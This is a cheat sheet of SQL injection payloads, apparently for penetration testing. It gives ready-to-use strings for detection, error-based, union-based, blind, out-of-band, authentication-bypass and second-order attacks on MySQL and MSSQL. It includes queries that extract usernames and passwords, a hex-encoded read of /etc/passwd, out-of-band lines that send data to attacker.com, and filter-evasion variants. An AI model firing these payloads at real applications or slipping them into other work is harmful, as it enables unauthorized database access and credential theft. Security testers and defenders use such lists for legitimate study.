# SQL Injection Payloads

## Detection
```
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR 1=1--
' OR 'x'='x
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
```

## Error-Based (MySQL)
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

## Error-Based (MSSQL)
```
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
'; SELECT 1/0--
' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--
```

## Union-Based
```
' ORDER BY 1--
' ORDER BY 5--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,user(),database(),version()--
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables--
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,username,password,4 FROM users--
```

## Blind — Boolean
```
' AND 1=1--   (true)
' AND 1=2--   (false)
' AND SUBSTRING(username,1,1)='a'--
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

## Blind — Time-Based
```
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
1' AND IF(1=1,SLEEP(5),0)--
' OR IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--
```

## WAF Bypass
```
'/**/OR/**/1=1--
' /*!OR*/ 1=1--
'%09OR%091=1--
' OR 0x313d31--
'||1=1--
' oR '1'='1
' OORR '1'='1
' or 'unusual'='unusual
%27 OR %271%27=%271
```

## Out-of-Band
```
' AND LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\x'))--
'; exec master..xp_dirtree '//attacker.com/x'--
' UNION SELECT 1,load_file(0x2F6574632F706173737764),3--
```

## Auth Bypass
```
admin'--
admin'/*
' OR 1=1--
' OR '1'='1'--
') OR ('1'='1
admin' #
' OR 1=1#
"admin"--
```

## Second Order
```
username: admin'--
(payload stored, triggered on profile load or password reset)
```
